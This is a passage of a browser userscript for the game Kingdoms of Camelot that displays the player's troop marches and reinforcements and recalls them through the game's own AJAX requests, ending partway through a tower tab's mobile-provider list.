                  Marchstatut = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
                  arrivedans = unsafeWindow.timestr(march.returnUnixTime - unixTime());
                  arrivedanssec = parseInt(march.returnUnixTime - unixTime());
                }
                if (statusm==2) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
                }
                if (statusm==5) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
                }
                if (statusm==4) { 
		   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png" align=absmiddle>&nbsp;'+culang.MTraidreset+'';
                }
                 if (statusm==3 || statusm==10 ) {  
		  Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png" align=absmiddle>&nbsp;'+culang.MTraidstopped+'';
		}
 
                s += '<TR align=left><td align=left width=10%>';
                if (march.marchType!=9 && statusm==1 && arrivedanssec>60) s +='<A title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
                if (march.marchType!=9 && statusm==2) s +='<A title="'+culang.sendhomeTitle+'" onclick="attack_recall('+ mid+', 1, '+Cities.cities[c].id+');" ><span><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
                if (march.marchType==9 && statusm==10 && arrivedanssec<=0) s +='<A title="'+culang.deleteb+'" onclick="raid_delete('+ mid+','+Cities.cities[c].id+');return false;"><span><img  alt="'+culang.shrdel+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
             
             s +='</td><td align=left width=10%>'+typeattack+'</td><td>'+arrivedans+'</td><td align=left width=15%>' + Marchstatut +'</td>\
                <TD align=left width=15%>' + player + '</td><td>'+pdxkoordlink(march.toXCoord,march.toYCoord)+'</td><td>' + knight +' </td><td colspan=12>'
				for (i=1; i<13; i++) {
	                  if (statusm==8) { 
	                    if (parseInt (march['unit'+ i +'Return']) > 0) {
	      	           s += names[i-1]+" :" + parseInt (march['unit'+ i +'Return']) + "<br>";
	      	          tot[i] += parseInt (march['unit'+ i +'Return']);
	                  }
	                  
	                  } else {
	                   if (parseInt (march['unit'+ i +'Count']) > 0) {
	                       s += names[i-1]+" :" + parseInt (march['unit'+ i +'Count']) + "<br>";
	                       tot[i] += parseInt (march['unit'+ i +'Count']);
	                   }
	                  }
                }
	      
                s += '</td><td style="font-size:11px">';
      		if (march.marchType!=9) {
      		  s += '<a  class=button20 title="'+culang.showDetails+'" onclick="view_march('+ mid+');return false;"; ><span>'+culang.shrdetails+'</psan></a></td>';
      		  }else {
      		  s+='</td>';
      		  }
      
                s += '</tr>';
              }
            }   

        } 
      } 
      s += '<TR><TD colspan=20><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
     	 for (k=0; k<names.length; k++)
     	 	s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
     	 s += '</tr>';
     	 s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
     	 for (i=1; i<13; i++)
     		s+= '<TD class="tot">'+ tot[i] +'</td>';
     	 s += '<td></td></tr></table>';
	 s += '<BR><BR><DIV style="font-size: 10px"></div>';
            
  } else { 
      
      
   var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
   if (matTypeof(que)=='object') {      
			var a=0;
			for (k in que){
	                   march = que[k]; 
	                   
	              if ((march.marchType!=2 && !Options.voirRaid) || (march.marchType!=9 && march.marchType!=2 && Options.voirRaid) ) {
                  a++;
	                   if (a==1) {
	         	             var cityID = 'city'+ Cities.cities[c].id;
	         	             var slots=0;
	   		     for(var z in Seed.queue_atkp[cityID])
	   		     	slots++;
	   	      	             
				var niveauPointRall=parseInt(getCityBuilding (Cities.cities[c].id, 12).maxLevel);
						if (niveauPointRall==12) niveauPointRall=11;
	         	  	     s+= '<TR><TD class="city">'+culang.shrrp+': '+slots+'/ '+niveauPointRall+'</td><TD class="city" colspan=17 align=center><font size=3><B><i><u>'+culang.holyplace+' ' + (parseInt(c)+1) + ' - '+ Cities.cities[c].name +'</b></td></tr>';
	         	        }
	                   var mid = k.substr(1);
	                   knight = '';
	                    if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
	   		  				    	for (i in Seed.knights['city'+ Cities.cities[c].id]) {
	   		  				    			if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '&nbsp;('+culang.knights+': ' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +')';
	   		  				    	}
	     				    } else knight = '';
	                  var playerId = march.toPlayerId;
			                 if (playerId==undefined) playerId=0;
			                 var cityId = march.toCityId;
			                 var tileType = parseInt(march.toTileType);
			                 var tileLevel = march.toTileLevel;
			                 var who = ''+culang.botStatUnknown+'';
			                 if (Seed.players['u' + playerId]) {
			 		 who = Seed.players['u' + playerId].n;
			 		}
			 		if (march.marchType==1) {
			 		  var player = "<span>"+culang.city+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}else {
			 		  var player = "<span title='"+culang.needRefresh+"'>"+culang.rptbarb+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}
			 		if (march.marchType==10 || march.marchType==11) { 
			 		  var player = "<span>"+culang.darkforest+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}
					var tileNames = [''+culang.barbarians+'', ''+culang.grassland+'', ''+culang.rptlake+'', ''+culang.forests+'', ''+culang.rpthill+'', ''+culang.rptmount+'', ''+culang.rptplain+'', ''+culang.city+'', ''+culang.darkforest+'' ];
			 		var numtile=parseInt(tileType/10) + 1;
			 		if (tileType==10) numtile=1;
			 		if (tileType==11) numtile=2;
			                 if (tileType <= 50) { // TS
			                   player = tileNames[numtile] +" "+culang.lvl+" " + tileLevel;
			                   /*if (playerId==0) {
			                    player += " - Libre";
			                   } else {
			                    player += " - " + who;
			                   }*/ 
			                 }

			                 if (tileType == 51 && playerId == 0 && march.toTileLevel==9) { // Barbares
							player = ""+culang.rptbarb+" "+culang.lvl+" " + tileLevel;
			                 }
							if (tileType == 51 && playerId == 0 && march.toTileLevel==7) { // Ville
			                   player = ""+culang.city+" "+culang.lvl+" " + tileLevel;
			                 }
			                 if (tileType == 54 && playerId == 0) { // Barbares
							player = ""+culang.shrDF+" "+culang.lvl+" " + tileLevel;
			                 }
			                 var nomville="";
			                 if (playerId > 0 && tileType == 51) { // ville
			                  if (march.marchType==1) {
			                   for(i=0; i<Cities.numCities; i++) {
			                    if (cityId==Cities.cities[i].id) {
			                     nomville=Cities.cities[i].name
			                      break;
			                    }
			                   }
			                   player = ''+culang.city+' '+ nomville;
			                  } else {
			                   player = ''+culang.city+' '+culang.lvl+' ' + tileLevel;
			                  }
			                 }
                var typeattack="?";
				if (march.marchType==3) typeattack=''+culang.scout+'';
				if (march.marchType==4) typeattack=''+culang.rptattack+'';
				if (march.marchType==10) typeattack=''+culang.rptattack+'';
				if (march.marchType==11) typeattack=''+culang.scout+'';
				if (march.marchType==1) typeattack=''+culang.transport+'';
				if (march.marchType==5) typeattack=''+culang.Mreassign+'';
				if (march.marchType==9) typeattack=''+culang.raitack+'';
				var now = new Date();
                var statusm = march.marchStatus;
                var Marchstatut="<span title='type : "+march.marchType+" "+culang.status+": "+statusm+"'>?</span> ";
                var arrivedans="0s";
                var arrivedanssec=0;
		if (statusm==1) { 
		 Marchstatut="";
		 if (march.marchType==3 || march.marchType==11) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/scouting.jpg" align=absmiddle>';
		 if (march.marchType==4 || march.marchType==10) 
		  Marchstatut+='<img src="'+IMGattacking+'" align=absmiddle>';
		 if (march.marchType==9) 
		  Marchstatut+='<img src="'+IMGattacking+'" align=absmiddle>';
		 if (march.marchType==1) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/transporting.jpg" align=absmiddle>';
                 if (march.marchType==5) 
                  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>';
		  Marchstatut+="&nbsp;"+culang.march+""; 
		  arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
		  arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
		}
                if (statusm==8) { 
                  Marchstatut = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
                  arrivedans = unsafeWindow.timestr(march.returnUnixTime - unixTime());
                  arrivedanssec = parseInt(march.returnUnixTime - unixTime());
                }
                if (statusm==2) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
                }
                if (statusm==5) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
                }
                if (statusm==4) { 
		   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png" align=absmiddle>&nbsp;'+culang.MTraidreset+'';
                }
                if (statusm==3 || statusm==10) {  
		  Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png" align=absmiddle>&nbsp;'+culang.MTraidstopped+'';
		}
 
                s += '<TR align=left><td align=left width=10%>';
                if (march.marchType!=9 && statusm==1 && arrivedanssec>60) s +='<A  title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')"><SPAN><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
                if (march.marchType!=9 && statusm==2) s +='<A  title="'+culang.sendhomeTitle+'" onclick="attack_recall('+ mid+', 1, '+Cities.cities[c].id+');" ><span><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
                if (march.marchType==9 && statusm==10 && arrivedanssec<=0) s +='<A title="'+culang.deleteb+'" onclick="raid_delete('+ mid+','+Cities.cities[c].id+');return false;"><span><img alt="'+culang.shrdel+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
               s +='</td><td align=left width=10%>'+typeattack+'</td><td>'+arrivedans+'</td><td align=left width=15%>' + Marchstatut +'</td>\
	                      <TD align=left width=15%>' + player + '</td><td>'+pdxkoordlink(march.toXCoord,march.toYCoord)+'</td><td>' + knight +' </td><td colspan=12>'
	      	       for (i=1; i<13; i++) {
	      	                  if (statusm==8) { 
	      	                    if (parseInt (march['unit'+ i +'Return']) > 0) {
	      	      	           s += names[i-1]+" :" + parseInt (march['unit'+ i +'Return']) + "<br>";
	      	      	          tot[i] += parseInt (march['unit'+ i +'Return']);
	      	                  }
	      	                  
	      	                  } else {
	      	                   if (parseInt (march['unit'+ i +'Count']) > 0) {
	      	                       s += names[i-1]+" :" + parseInt (march['unit'+ i +'Count']) + "<br>";
	      	                       tot[i] += parseInt (march['unit'+ i +'Count']);
	      	                   }
	      	                  }
	                      }
	      	      
	                      s += '</td><td style="font-size:11px">';
	            		if (march.marchType!=9) {
	            		  s += '<a  class=button20 title="'+culang.showDetails+'" onclick="view_march('+ mid+');return false;";><span>'+culang.shrdetails+'</psan></a></td>';
	            		  }else {
	            		  s+='</td>';
	            		  }
                s += '</tr>';
	        }
     } 
     s += '<TR><TD colspan=18><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
     for (k=0; k<names.length; k++)  s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
     s += '</tr>';
     s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
     for (i=1; i<13; i++) s+= '<TD class="tot">'+ tot[i] +'</td>';
     s += '<td></td></tr></table>';
     s += '<BR><BR><DIV style="font-size: 10px"></div>';
    } else {
     s= '<br><center><b>'+culang.nomarches+'</b></center>';
    } 
   } 
   document.getElementById('showMarchDiv').innerHTML = s;
   t.displayTimer = setTimeout (function() { t.showMarches(numville);   }, 1000);
  },
  ajaxDeleteRaid: function(marchId, cityId) {
      var villeencours=cityId;
               var march = Seed.queue_atkp["city" + villeencours]["m" + marchId];
               if (march == null){
                 alert(""+culang.MTerr+"");
                 return;
               }    
               var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
               params.action="deleteMarch";
               params.marchId = marchId;
			   params.ctrl="BotManager";
			   params.settings={cityId:villeencours}; 
			   unsafeWindow.ajax.Request(unsafeWindow.g_ajaxpath+"ajax/_dispatch.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:params,loading:true,
		onSuccess:function(transport) {
		  var m = eval("(" + transport.responseText + ")");
		   if (m.ok){        
            var j=marchId;
            var t=cityId;
            var n=Seed.units["city"+t];
            for(var o=0;o<13;++o){
             if (m["unit"+o+"Return"]) {
              var p=parseInt(m["unit"+o+"Return"]);
              if(!isNaN(p)&&(p>0)){
               n["unt"+o]=parseInt(n["unt"+o])+p;
               }
             }
            }
            unsafeWindow.cityinfo_army();
            var s="city"+t;
            // recherche de mon chevalier
            var mymarch = unsafeWindow.seed.queue_atkp["city" + t]["m" + j];
            var kngId= mymarch.knightId;
            delete Seed.queue_atkp[s]["m"+j];
            if(unsafeWindow.Object.keys(Seed.queue_atkp[s]).length==0){
              Seed.queue_atkp[s]=[];
            }
            Seed.knights["city"+t]["knt"+kngId].knightStatus=1;          
     } else {

       
     }
    }, onFailure: function () {
       
    },
   });

  },
// MARCHES SUBTAB { REINFORCE }
  showReinforcementsOut : function (){
      var rownum = 0;
	  var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
      var s = '<div class=pdxStat>'+culang.HTMrein+'</div>';
      s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;}</style>';
      s += '<TABLE cellspacing=0 cellpadding=2 width=100%>';
      tot = [];
      for (i=0; i<13; i++)
        tot[i] = 0;
        
      for (var c=0; c<Cities.numCities; c++){
        var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
        if (matTypeof(que)=='array')
          continue;

        var a=0;
        for (k in que){
          march = que[k]; 
          if (march.marchType==2) { 
          a++;
          if (a==1) {
	   s+= '<TR><TD class="city" colspan=16 align=left><B>'+culang.holyplace+' ' + (parseInt(c)+1) + ': '+ Cities.cities[c].name +'</b></td></tr>';
          }
          var mid = k.substr(1);
          knight = '';
	  if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
	  		  for (i in Seed.knights['city'+ Cities.cities[c].id]) {
	  		    if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +'';
	  		  }
  	  } else knight = '';
          if (parseInt(march.knightCombat)>0) knight=' ('+ march.knightCombat +')';
	  try {
	     player = Seed.players['u'+march.toPlayerId].n; //Seed.players['u'+k].n;
	   } catch (err){
	     player = ''+culang.botStatUnknown+'';
          }
        
          s += '<TR align=left><td align=left width=12%>';
          var statusm = march.marchStatus;
          var Marchstatut='';
          var arrivedans="0s";
          var arrivedanssec=0;
          if (statusm==1) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.march+'';
            arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
            arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
          }
          if (statusm==2) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
          }
          if (statusm==8) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
            arrivedans = unsafeWindow.timestr(parseInt(march.returnUnixTime - unixTime())); 
            arrivedanssec = parseInt(march.returnUnixTime - unixTime());
          }
          if (statusm==5) { 
           Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
          }
          if (statusm==1 && arrivedanssec>60){
            s +='<A title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
          }
          if (statusm==2) { 
             s +='<A title="'+culang.sendhomeTitle+'" onclick="pr57Recall('+ mid+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a>';
          } else {
            s += '&nbsp;';
          }

          s+='</td><td align=left width=15%>'+Marchstatut+'</td><td>'+arrivedans+'</td><TD align=left width=30%>' + player + ' '+pdxkoordlink(march.toXCoord,march.toYCoord)+'&nbsp;' + knight +' </td><td colspan=12>'
          for (i=1; i<13; i++) {
            if (statusm==8) { 
              if (parseInt (march['unit'+ i +'Return']) > 0) {
	          s += " " + parseInt (march['unit'+ i +'Return']) + " "+names[i-1]+"<br>";
	          tot[i] += parseInt (march['unit'+ i +'Return']);
            }
            
            } else {
             if (parseInt (march['unit'+ i +'Count']) > 0) {
                s += " " + parseInt (march['unit'+ i +'Count']) + " "+names[i-1]+"<br>";
                tot[i] += parseInt (march['unit'+ i +'Count']);
             }
            }
          }
          s += '</td></tr>';
          }
        }      
      } 
      
       s += '<TR><TD colspan=16><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
            for (k=0; k<names.length; k++)
              s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
            s += '</tr>';
            s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
            for (i=1; i<13; i++)
              s+= '<TD class="tot">'+ tot[i] +'</td>';
      s += '</tr></table>';
      t.marchDiv.innerHTML = s;
      t.displayTimer = setTimeout (t.showReinforcementsOut, 1000);
      return;
  },
     
  showReinforcements : function (){
   var rownum = 0;
	var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    var t = Tabs.Marches;
    clearTimeout (t.displayTimer);
      
    function clickShowRemaining (){
      checkBox = document.getElementById('idCheck2');
      if (checkBox.checked)
        Options.encRemaining = false;
      else
        Options.encRemaining = true;
      t.show2 ();
    }
  
    enc = {};
    numSlots = 0;
    
    if (matTypeof(Seed.queue_atkinc) != 'array'){
      for (k in Seed.queue_atkinc){
        march = Seed.queue_atkinc[k];
        if (march.marchType == 2){
          ++numSlots;
          city = march.toCityId;
          from = march.fromPlayerId;
          if (!enc[city])
            enc[city] = {};
          if (!enc[city][from])
            enc[city][from] = [];
          s = {};
          s.knight = parseInt (march.knightCombat);
          s.marchId = k.substr(1);
          s.fromXCoord = march.fromXCoord;
          s.fromYCoord = march.fromYCoord;
          s.troops = [];
          for (i=1; i<13; i++){
            if (Options.encRemaining)
              s.troops[i] = parseInt (march['unit'+ i +'Return']);
            else
              s.troops[i] = parseInt (march['unit'+ i +'Count']);
          }
          enc[city][from].push (s);
        }
      }
    }
    s = '<div class=pdxStat>'+culang.HTMemb+'</div>';
    if (numSlots == 0){
      s += '<BR><CENTER><B>'+culang.MTnodefforu+'</b></center>';
    } else {
      s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .entete{background:#efa9a9;}</style>';
      s += '<TABLE cellspacing=0 cellpadding=2 width=100%><tr><td class="entete">'+culang.action+'</td><td class="entete">'+culang.coord+'</td><td class="entete">'+culang.player+'</td><td class="entete">'+culang.knights+'</td><td colspan=12 class="entete">'+culang.troops+'</td><td class="entete">'+culang.usage+'</td></tr>';
 
      tot = [];
      totent= 0;
      for (i=0; i<13; i++) {
        tot[i] = 0;
        
      }
      for (c in Cities.cities){
        dest = Cities.cities[c].id;
        if (enc[dest]){
          s+= '<TR><TD class="city" colspan=17 align=left><B>'+culang.city+' ' + (parseInt(c)+1) + ' : '+ Cities.cities[c].name +'</b></td></tr>';
          for (p in enc[dest]){
            try {
              player = Seed.players['u'+p].n;
            } catch (err){
              player = '???';
            }
            for (m=0; m<enc[dest][p].length; m++){
              var march = enc[dest][p][m];
              knight = '';
              if (march.knight > 0)
                knight = ' '+ march.knight +'';          
              s += '<TR align=left><td align=left width=12%><A  title="'+culang.sendhomeTitle+'" onclick="r8x6Home('+ march.marchId +')"><SPAN><img  alt="'+culang.sendhome2+'" src="'+IMGdeleteButton+'" border=0 ></span></a></td>\
              <TD align=left>'+pdxkoordlink(march.fromXCoord,march.fromYCoord)+'</td>   <TD align=left width=25%>'+ player +' </td><td align=left>'+ knight+'</td><td colspan=12>'
              var g=0;
              for (i=1; i<13; i++){
               if (march.troops[i] > 0) {
                s += ''+ march.troops[i]  +' '+ names[i-1]  +'<br>';
               }
               tot[i] += march.troops[i];
               g+=parseInt(march.troops[i])*parseInt(unsafeWindow.unitupkeeps[i]);
               
              }
              totent += g;
              s += '</td><td>';
              s += addCommas(g) + '</td></tr>';
            }
          }
        }
      }
      s += '<TR><TD colspan=17><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
      for (k=0; k<names.length; k++)
        s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
      s += '</tr>';
      s += '<TR align=center><TD class="tot" align=left width=10% rowspan=2><B>'+culang.Htotal+'</b></td>';
      for (i=1; i<13; i++)
        s+= '<TD class="tot">'+ tot[i] +'</td>';
      s += '</tr><td colspan=12>'+culang.foodusagetot+' '+addCommas(totent)+' '+culang.foodusagetot2+'</td></table>';
    }

    s += '<BR><BR><INPUT type=CHECKBOX id=idCheck2 '+ (Options.encRemaining?'':' CHECKED ') +'> '+culang.showOrginal+'';
    s += '<BR><BR><DIV style="font-size: 10px"><u><b>'+culang.impnote+'</b></u>: '+culang.Embnote+'!</div>';
    t.marchDiv.innerHTML = s;
    checkBox = document.getElementById('idCheck2');
    checkBox.addEventListener('click', clickShowRemaining, false);
    t.displayTimer = setTimeout (t.show2, 10000);
  },
  butSendHome : function (marchId){
        var t = Tabs.Marches;
        t.ajaxSendHome (marchId); 
   },
     counts:[],
  getMarchCount : function (cityNum) {
    var t = Tabs.Marches;
    for(var i=0; i<Cities.numCities; i++) {   
      cityId = 'city'+ Cities.cities[i].id;
      t.counts[i] = 0;
      for (var k in Seed.queue_atkp[cityId]){   
        march = Seed.queue_atkp[cityId][k];
        if (typeof (march) == 'object'){
          t.counts[i]++;
        }
      }
    }
    return t.counts[cityNum];
   },
   ajaxSendHome : function (marchId, notify){ 
     var march = Seed.queue_atkinc['m'+ marchId];
     if (march == null){
       notify (''+culang.marchnotfound+''); 
       return;
     }    
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     params.mid = marchId;
     params.cid = march.toCityId;
     params.fromUid = march.fromPlayerId;
     params.fromCid = march.fromCityId;
     new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/kickoutReinforcements.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         onSuccess: function (rslt) {
           if (rslt.ok){
             var upkeep = 0;
             for (var i=1; i<13; i++)
               upkeep += parseInt(march["unit" + i + "Return"]) * parseInt(unsafeWindow.unitupkeeps[i]);
             unsafeWindow.seed.resources["city"+ march.toCityId].rec1[3] -= upkeep;
             if (parseInt(march.fromPlayerId) == parseInt(unsafeWindow.tvuid)) {
               var mymarch = unsafeWindow.seed.queue_atkp["city" + march.fromCityId]["m" + marchId];
               var marchtime = Math.abs(parseInt(mymarch.destinationUnixTime) - parseInt(mymarch.eventUnixTime));
               mymarch.returnUnixTime = unixTime() + marchtime;
               mymarch.marchStatus = 8;
             }
             delete unsafeWindow.seed.queue_atkinc["m" + marchId];
             if (notify != null)
               notify(null);
           } else {
             if (notify != null)
               notify(rslt.errorMsg);
           }
         },
         onFailure: function () {
           if (notify != null)
             notify(rslt.errorMsg);
         },
     });
  },
  butRecall2 : function (marchId){     var t = Tabs.Marches;     t.ajaxRecall2 (marchId);   },
  ajaxRecall2 : function (marchId, notify){
      var villeencours;
          for (var c=0; c<Cities.numCities; c++){
            var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
            if (matTypeof(que)=='array')
              continue;
            for (k in que){
              if (k == 'm'+marchId){
                villeencours = Cities.cities[c].id;
                break;
              }
            }    
        }  
  
  
           var march = Seed.queue_atkp["city" + villeencours]["m" + marchId];
           if (march == null){
             alert(""+culang.marchnotfound+"");
             return;
           }    
           var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
           params.mid = marchId;
           params.cid = villeencours; //march.toCityId;
            
           new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/undefend.php" + unsafeWindow.g_ajaxsuffix, {
               method: "post",
               parameters: params,
               onSuccess: function (rslt) {
                 if (rslt.ok){
 
                   var mymarch = unsafeWindow.seed.queue_atkp["city" + villeencours]["m" + marchId];
                   var marchtime = Math.abs(parseInt(mymarch.destinationUnixTime) - parseInt(mymarch.eventUnixTime));
                   mymarch.returnUnixTime = unixTime() + marchtime;
                   mymarch.marchStatus = 8;
     
                 } else {
                  
                  
                 }
               },
               onFailure: function () {
               
               
               },
     });
          
  },   
  ajaxRecall : function (marchId, cid, notify){
     
              var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
              params.mid = marchId;
              params.cid = cid;
              
              new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelMarch.php" + unsafeWindow.g_ajaxsuffix, {
                  method: "post",
                  parameters: params,
                  onSuccess: function (rslt) {
                    if (rslt.ok){
                    
                     if(rslt.updateSeed){
 		       unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].marchStatus=8;   
 		       var marchtime=parseInt(unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].returnUnixTime)-parseInt(unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].destinationUnixTime);
 		       var ut=unsafeWindow.unixtime();
 		       if(unsafeWindow.seed.playerEffects.returnExpire>unsafeWindow.unixtime()){marchtime*=0.5}
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].destinationUnixTime=rslt.destinationUnixTime||ut;
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].returnUnixTime=rslt.returnUnixTime||ut+marchtime*rslt.returnMultiplier;
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].marchStatus=8;
 		       unsafeWindow.update_seed(rslt.updateSeed);
                     }
                     for(var j=1;j<13;j++){
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId]["unit"+j+"Return"]=parseInt(unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId]["unit"+j+"Count"])
 		     }
 		    }
                  },
                  onFailure: function () {
                  
                  
                  },
     });

  },
};
/************************************************************************************
*						KOC POWER - TABS TOWER										*
************************************************************************************/
Tabs.tower = {  tabLabel: culang.holyplace,  tabOrder: StyleOptions.toHeiligtum,  myDiv: null,  generateIncomingFunc : null,  fixTargetEnabled : false,  secondTimer : null,  soundPlaying : false,  defMode : {},    soundRepeatTimer : null,  soundStopTimer : null,  towerMarches: [],
  Providers : { 0: { 'country': "--Land--", 'provider': "--"+culang.provider+"--" }, 1: { 'country': "AUSTRALIA", 'provider': "T-Mobile" }, 2: { 'country': "AUSTRALIA", 'provider': "Optus Zoo" }, 3: { 'country': "AUSTRIA", 'provider': "T-Mobile" }, 4: { 'country': "BULGARIA", 'provider': "Mtel" }, 5: { 'country': "BULGARIA", 'provider': "Globul" }, 6: { 'country': "CANADA", 'provider': "Aliant" }, 7: { 'country': "CANADA", 'provider': "Bell Mobility" }, 8: { 'country': "CANADA", 'provider': "Fido" }, 9: { 'country': "CANADA", 'provider': "MTS Mobility" }, 10: { 'country': "CANADA", 'provider': "Rogers Wireless" }, 11: { 'country': "CANADA", 'provider': "Sasktel Mobility" }, 12: { 'country': "CANADA", 'provider': "Telus" }, 13: { 'country': "CANADA", 'provider': "Virgin Mobile" }, 14: { 'country': "CANADA", 'provider': "Presidents Choice" }, 15: { 'country': "GERMANY", 'provider': "T-Mobile" }, 16: { 'country': "GERMANY", 'provider': "Vodafone" }, 17: { 'country': "GERMANY", 'provider': "O2" }, 18: { 'country': "GERMANY", 'provider': "E-Plus" }, 19: { 'country': "ICELAND", 'provider': "OgVodafone" }, 20: { 'country': "ICELAND", 'provider': "Siminn" }, 21: { 'country': "INDIA", 'provider': "Andhra Pradesh AirTel" }, 22: { 'country': "INDIA", 'provider': "Andhra Pradesh Idea Cellular" }, 23: { 'country': "INDIA", 'provider': "Chennal Skycell 